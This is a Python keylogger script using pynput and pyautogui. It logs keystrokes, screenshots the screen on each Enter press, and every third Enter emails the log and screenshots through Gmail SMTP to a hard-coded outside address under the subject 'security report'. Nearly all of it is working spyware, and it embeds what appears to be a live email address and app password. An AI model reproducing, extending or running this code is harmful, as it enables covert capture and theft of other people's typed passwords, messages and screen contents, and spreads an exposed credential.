
from pynput import keyboard
import pyautogui
from datetime import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

# ========== Configuration ==========
sender_email = "manpreetsingh11711@gmail.com"
receiver_email = "nanu70126@gmail.com"
password = "goffhbllkzpzydgh"  # Gmail App Password

# ========== Global Variables ==========
buffer = ""
screenshot_counter = 0
enter_counter = 0
screenshot_folder = "screenshots"

# Create folder if it doesn't exist
os.makedirs(screenshot_folder, exist_ok=True)
# ========== Email Sending Function ==========  
def send_email():
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email    



    msg["Subject"] = "security report"

    # Attach keylog.txt
    try:
        with open("keylog.txt", "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", "attachment; filename=keylog.txt")
            msg.attach(part)
    except Exception as e:
        print(f"[!] Couldn't attach keylog.txt: {e}")

    # ✅ Attach all screenshots taken so far
    try:
        for i in range(screenshot_counter):
            screenshot_path = f"{screenshot_folder}/img_{i}.png"
            if os.path.exists(screenshot_path):
                with open(screenshot_path, "rb") as f:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename=img_{i}.png")
                    msg.attach(part)
    except Exception as e:
        print(f"[!] Error attaching screenshots: {e}")

    # Send email via Gmail SMTP
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.send_message(msg)
            print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")


# ========== Handle Key Press ==========
def on_press(key):
    global buffer, screenshot_counter, enter_counter

    with open("keylog.txt", "a") as f:
        try:
            buffer += key.char  # Normal character keys
        except AttributeError:
            if key == keyboard.Key.enter:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                line = f"[{timestamp}] Logs: {buffer}\n"
                f.write(line)
                f.flush() 
                os.fsync(f.fileno())
                enter_counter += 1

    # Save this line BEFORE clearing the buffer
                if enter_counter % 3 == 0:
                    global third_enter_text
                    third_enter_text = line  # ✅ this is the latest line being logged

    # Take screenshot
                screenshot_path = f"{screenshot_folder}/img_{screenshot_counter}.png"
                screenshot = pyautogui.screenshot()
                screenshot.save(screenshot_path)
                screenshot_counter += 1

    # Send email every 3rd Enter
                if enter_counter % 3 == 0:
                    send_email()

                buffer = ""  # ✅ clear buffer AFTER saving it to line and email


            elif key == keyboard.Key.space:
                buffer += " "
            elif key == keyboard.Key.tab:
                buffer += "\t"
            elif key == keyboard.Key.backspace:
                buffer = buffer[:-1]
            elif key == keyboard.Key.esc:
                # Save final input and stop keylogger
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] Logs: {buffer}\n")
                print("\n[+] Keylogger stopped.")
                create_report()
                return False
            else:
                buffer += f"[{key.name}]"

# ========== Create Summary Report ==========
def create_report():
    with open("keylog.txt", "w") as report:
        report.write("=== Keylogger Summary ===\n")
        report.write(f"Total Enter Presses: {enter_counter}\n")
        report.write(f"Total Screenshots: {screenshot_counter}\n")
        report.write(f"Generated: {datetime.now()}\n")
        report.write("Keylog saved in keylog.txt\n")
        report.write(f"Screenshots saved in {screenshot_folder}/\n")
    print("[+] Summary saved to report.txt.")

# ========== Start Keylogger ==========
if __name__ == "__main__":
    print("[*] Keylogger is running. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
